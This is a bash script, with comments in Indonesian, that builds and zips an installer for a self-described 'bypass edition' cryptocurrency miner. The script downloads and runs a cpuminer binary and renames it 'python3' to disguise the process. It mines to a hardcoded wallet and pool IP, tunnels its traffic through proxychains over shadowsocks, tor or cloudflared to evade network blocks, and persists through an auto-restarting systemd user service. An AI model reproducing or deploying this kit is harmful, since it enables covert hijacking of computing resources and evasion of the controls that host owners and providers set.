# Buat folder & subfolder
mkdir -p ~/genzo_miner_bypass/{bin,conf,systemd}
cd ~/genzo_miner_bypass

# Buat script utama
cat > bin/genzo_miner_bypass.sh <<'EOF'
#!/bin/bash
# 🛡️ GENZO MINER - BYPASS EDITION
WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzo"
POOL="stratum+tcp://159.223.48.143:443"
THREADS=$(nproc --all)
BASE="$HOME/genzo_miner_bypass"
MINER_DIR="$HOME/miner_temp"
PROXYCHAINS="$BASE/bin/proxychains4"
mkdir -p "$MINER_DIR"; cd "$MINER_DIR" || exit

# Deteksi metode bypass
if [[ -x "$BASE/bin/ss-local" ]]; then
  METHOD="shadowsocks"; PCONF="proxychains_ss.conf"
  "$BASE/bin/ss-local" -s 127.0.0.1 -p 8388 -k pass -m aes-256-gcm -l 1080 -u &
elif [[ -x "$BASE/bin/obfs4proxy" ]]; then
  METHOD="obfs4"; PCONF="proxychains_tor.conf"
  tor &
elif [[ -x "$BASE/bin/cloudflared" ]]; then
  METHOD="doh"; PCONF="proxychains_doh.conf"
  "$BASE/bin/cloudflared" proxy-dns --port 5353 &
elif [[ -x "$PROXYCHAINS" ]]; then
  METHOD="socks5"; PCONF="proxychains.conf"
else
  echo "[❌] Tool bypass tidak ditemukan di $BASE/bin"
  exit 1
fi

PROXY_CMD="$PROXYCHAINS -f $BASE/conf/$PCONF"
while true; do
  if ! pgrep -x "python3" > /dev/null; then
    wget -q --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 python3 && chmod +x python3
    echo "[INFO][$METHOD] Menjalankan miner..."
    $PROXY_CMD ./python3 -a power2b -o "$POOL" -u "$WALLET" -p x -t"$THREADS" > /dev/null 2>&1 &
  fi
  sleep 60
done
EOF

# Set executable
chmod +x bin/genzo_miner_bypass.sh

# Buat konfigurasi proxychains
cat > conf/proxychains.conf <<EOF
strict_chain
quiet_mode
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF
cp conf/proxychains.conf conf/proxychains_ss.conf
cp conf/proxychains.conf conf/proxychains_tor.conf
cp conf/proxychains.conf conf/proxychains_doh.conf

# Buat systemd unit
cat > systemd/genzo_miner_bypass.service <<EOF
[Unit]
Description=Genzo Miner Bypass Full
After=network.target

[Service]
ExecStart=%h/genzo_miner_bypass/bin/genzo_miner_bypass.sh
Restart=always
RestartSec=5
KillMode=process

[Install]
WantedBy=default.target
EOF

# Buat installer
cat > install.sh <<'EOF'
#!/bin/bash
BASE="$HOME/genzo_miner_bypass"
BIN="$BASE/bin"; CONF="$BASE/conf"; SD="$HOME/.config/systemd/user"
mkdir -p "$BIN" "$CONF" "$SD"
cp bin/* "$BIN/"; chmod +x "$BIN/"*
cp conf/*.conf "$CONF/"
cp systemd/genzo_miner_bypass.service "$SD/"
systemctl --user daemon-reexec
systemctl --user daemon-reload
systemctl --user enable genzo_miner_bypass.service
systemctl --user restart genzo_miner_bypass.service
echo "[✅] Genzo Miner Bypass Lengkap terpasang!"
echo "Status: systemctl --user status genzo_miner_bypass.service"
EOF
chmod +x install.sh

# Zip folder
cd ~
zip -r genzo_miner_bypass.zip genzo_miner_bypass
echo "✅ ZIP installer siap di ~/genzo_miner_bypass.zip"
